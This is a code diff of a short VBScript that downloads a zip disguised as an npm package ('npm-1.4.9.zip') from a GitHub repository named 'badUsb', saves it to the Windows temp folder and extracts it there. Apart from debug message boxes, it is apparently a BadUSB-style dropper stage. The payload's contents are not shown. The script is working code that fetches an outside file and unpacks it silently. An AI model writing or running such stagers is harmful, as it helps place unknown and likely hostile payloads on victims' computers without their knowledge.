@@ -1,13 +1,50 @@
+@@ -0,0 +1,49 @@
 MsgBox("YAY")
 
-dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
-dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "https://github.com/nerothe/badUsb/raw/master/npm-1.4.9.zip", False
-xHttp.Send
+tmpDir = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
 
-with bStrm
-    .type = 1 '//binary
-    .open
-    .write xHttp.responseBody
-    .savetofile "%temp%\npm-1.4.9.zip", 2 '//overwrite
-end with
+strLink = "https://github.com/nerothe/badUsb/raw/master/npm-1.4.9.zip"
+strSaveName = Mid(strLink, InStrRev(strLink,"/") + 1, Len(strLink))
+strSaveTo = tmpDir & "\" & strSaveName
+npmSaveTo = tmpDir & "\NPM\"
+
+MsgBox(strSaveTo)
+
+Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
+
+objHTTP.Open "GET", strLink, False
+
+objHTTP.Send
+ Set objFSO = CreateObject("Scripting.FileSystemObject")
+ If objFSO.FileExists(strSaveTo) Then
+   objFSO.DeleteFile(strSaveTo)
+ End If
+
+ If objHTTP.Status = 200 Then
+   Dim objStream
+   Set objStream = CreateObject("ADODB.Stream")
+   With objStream
+       .Type = 1 'adTypeBinary
+       .Open
+       .Write objHTTP.ResponseBody
+       .SaveToFile strSaveTo
+       .Close
+   End With
+   set objStream = Nothing
+ End If
+
+
+ ZipFile=strSaveTo
+ ExtractTo=npmSaveTo
+
+
+ Set fso = CreateObject("Scripting.FileSystemObject")
+ If NOT fso.FolderExists(ExtractTo) Then
+    fso.CreateFolder(ExtractTo)
+ End If
+
+ set objShell = CreateObject("Shell.Application")
+ set FilesInZip=objShell.NameSpace(ZipFile).items
+ objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
+ Set fso = Nothing
+ Set objShell = Nothing
